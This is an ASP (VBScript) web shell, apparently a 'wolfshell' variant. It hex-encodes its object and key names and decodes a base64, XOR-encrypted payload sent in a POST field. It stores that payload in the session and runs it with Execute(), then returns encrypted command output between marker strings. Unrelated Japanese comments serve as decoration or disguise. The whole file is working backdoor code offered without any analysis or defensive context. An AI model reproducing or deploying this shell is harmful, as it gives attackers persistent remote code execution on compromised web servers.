<%
Dim obj_yz12, res_ab34
Set obj_yz12 = Server.CreateObject(d_hex("536372697074696e672e44696374696f6e617279")) 'Scripting.Dictionary

'// 月が綺麗ですね。
Function b64_dec_uv(ByVal c)
    Dim x, n
    Set x = CreateObject(d_hex("4d73786d6c322e444f4d446f63756d656e742e332e30")) 'Msxml2.DOMDocument.3.0
    Set n = x.CreateElement("b64")
    n.dataType = "bin.base64"
    n.text = c
    b64_dec_uv = n.nodeTypedValue
End Function

'// 頑張ってください！
Function b64_enc_wx(ByVal d)
    Dim x, n
    Set x = CreateObject(d_hex("4d73786d6c322e444f4d446f63756d656e742e332e30"))
    Set n = x.CreateElement("b64")
    n.dataType = "bin.base64"
    n.nodeTypedValue = d
    b64_enc_wx = n.text
End Function

'// 腹が減っては戦はできぬ。
Function x_op_rs(dat, is_b)
    Dim sz, i, k_len, k_str, st
    k_str = d_hex("33633665306238613963313532323461") '3c6e0b8a9c15224a
    k_len = len(k_str)
    Set st = CreateObject(d_hex("41444f44422e53747265616d")) 'ADODB.Stream
    st.CharSet = "iso-8859-1"
    st.Type = 2
    st.Open
    If IsArray(dat) Then
        sz=UBound(dat)+1
        For i=1 To sz
            st.WriteText chrw(ascb(midb(dat,i,1)) Xor Asc(Mid(k_str,(i mod k_len)+1,1)))
        Next
    End If
    st.Position = 0
    If is_b Then
        st.Type = 1
        x_op_rs=st.Read()
    Else
        x_op_rs=st.ReadText()
    End If
End Function

'// 何食べようかな…
Function d_hex(str_h)
    Dim r, i
    r = ""
    For i = 1 To Len(str_h) Step 2
        r = r & Chr(CLng("&H" & Mid(str_h, i, 2)))
    Next
    d_hex = r
End Function

Dim p_dat, flow_state
p_dat = request.Form(d_hex("776f6c667368656c6c")) 'wolfshell
flow_state = 0
If not IsEmpty(p_dat) Then
    If IsEmpty(Session(d_hex("7061796c6f6164"))) Then 'payload
        flow_state = 1
    Else
        flow_state = 2
    End If
End If

'// 人生は一度だけです。
Select Case flow_state
    Case 1
        p_dat = x_op_rs(b64_dec_uv(p_dat), False)
        Session(d_hex("7061796c6f6164")) = p_dat
        Response.End
    Case 2
        p_dat = x_op_rs(b64_dec_uv(p_dat), True)
        obj_yz12.Add d_hex("7061796c6f6164"), Session(d_hex("7061796c6f6164"))
        Execute(obj_yz12(d_hex("7061796c6f6164")))
        res_ab34 = run(p_dat)
        Response.Write(d_hex("613731616231")) 'a71ab1
        If not IsEmpty(res_ab34) Then
            Response.Write b64_enc_wx(x_op_rs(res_ab34, True))
        End If
        Response.Write(d_hex("346238323539")) '4b8259
End Select
%>